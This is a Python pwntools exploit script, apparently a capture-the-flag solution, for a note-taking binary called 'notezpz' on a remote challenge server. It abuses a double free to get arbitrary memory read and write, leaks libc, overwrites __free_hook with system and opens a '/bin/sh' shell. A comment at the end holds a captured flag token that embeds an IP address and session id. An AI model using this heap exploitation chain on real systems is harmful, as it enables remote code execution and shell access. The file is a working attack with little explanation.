#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./notezpz"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 7003

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog, """ c """)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))
    p.recvuntil("'")
    return p.recvuntil("'", drop=True)

# Writes a string to the supplied memory address
def write_memory(src, dest):
    set_memory(src)
    set(1, dest)

# Reads memory at the supplied address
def read_memory(src):
    set_memory(src)
    return u32(ask(1)[:4])

# Sets the question pointer of questions[1] to be the supplied memory address
def set_memory(memory_to_leak, next_pointer=0x0):
    if (next_pointer == 0x0):
        next_pointer = elf.symbols["print_question"]

    payload = p32(0x0) * 0x7
    payload += p32(0x00000021)
    payload += p32(next_pointer)
    payload += p32(0x0) * 0x5
    payload += p32(memory_to_leak)
    payload += p32(0x00000021)
    set(0, payload)

start()

# Double free 1, so when allocating 2 you will store the back pointer to 1 in a chunk
create()
create()
destroy(1)
destroy(1)
create()

#
heap_addr = u32(ask(2)[:4])

# Sets back pointer of 1 to itself, so when allocating a question, you allocate the same chunk twice
set_memory(0x0, heap_addr)
create()
elf.address = u32(ask(3)[:4]) - elf.symbols["print_question"]

# Fix up the question pointer to correctly point at the question
set_memory(heap_addr + 0x20)

libc_base = read_memory(elf.got["puts"]) - 0x67b40  # - 0x67c10
system    = libc_base + 0x03d200                    # + 0x3d250
free_hook = libc_base + 0x1d98d0                    # + 0x1d98d0

write_memory(free_hook, p32(system))
set(0, "/bin/sh\x00")

p.interactive()
p.close()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1ub3RlenB6IiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiI5NzE1YzYyYS1iMGU5LTQ0MjgtODcyMC1mYTViMzQwM2VmM2MifQ.2-Rekse7KywrGT7ZAHC1T-uFiH1xe39-oboyJ_u9UQg}